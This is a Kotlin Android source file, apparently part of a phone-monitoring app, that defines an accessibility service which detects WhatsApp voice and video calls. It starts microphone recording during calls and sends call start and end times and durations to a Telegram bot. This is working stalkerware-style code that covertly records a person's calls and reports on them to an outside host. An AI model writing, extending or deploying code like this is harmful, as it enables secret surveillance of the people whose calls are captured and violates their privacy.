package com.dec.monitor.call

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Intent
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import com.dec.monitor.TelegramBot
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.*

class WhatsAppCallDetector : AccessibilityService() {

    private var waCallActive = false
    private var waCallStart = 0L

    override fun onServiceConnected() {
        serviceInfo = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                    AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
            packageNames = arrayOf(
                "com.whatsapp",
                "com.whatsapp.w4b"
            )
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
            notificationTimeout = 100
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        val pkg = event.packageName?.toString() ?: return

        if (pkg != "com.whatsapp" && pkg != "com.whatsapp.w4b") return

        val className = event.className?.toString() ?: ""
        val text = event.text.joinToString(" ").lowercase()

        // WhatsApp call screen detection
        val isCallScreen = className.contains("call", ignoreCase = true) ||
                text.contains("calling") || text.contains("ringing") ||
                text.contains("ongoing") || text.contains("voice call") ||
                text.contains("video call")

        if (isCallScreen && !waCallActive) {
            waCallActive = true
            waCallStart = System.currentTimeMillis()
            val time = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
            CoroutineScope(Dispatchers.IO).launch {
                TelegramBot.sendMessage("💬 <b>WhatsApp Call Started</b>\nTime: $time")
            }
            // start mic recording for WA call
            val serviceIntent = Intent(this, CallRecordingService::class.java)
            serviceIntent.putExtra("number", "WhatsApp")
            startForegroundService(serviceIntent)

        } else if (!isCallScreen && waCallActive) {
            waCallActive = false
            val duration = ((System.currentTimeMillis() - waCallStart) / 1000).toString() + "s"
            val time = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
            CoroutineScope(Dispatchers.IO).launch {
                TelegramBot.sendMessage("🔴 <b>WhatsApp Call Ended</b>\nDuration: $duration\nTime: $time")
            }
            stopService(Intent(this, CallRecordingService::class.java))
        }
    }

    override fun onInterrupt() {
        Log.d("WACallDetector", "Interrupted")
    }
}
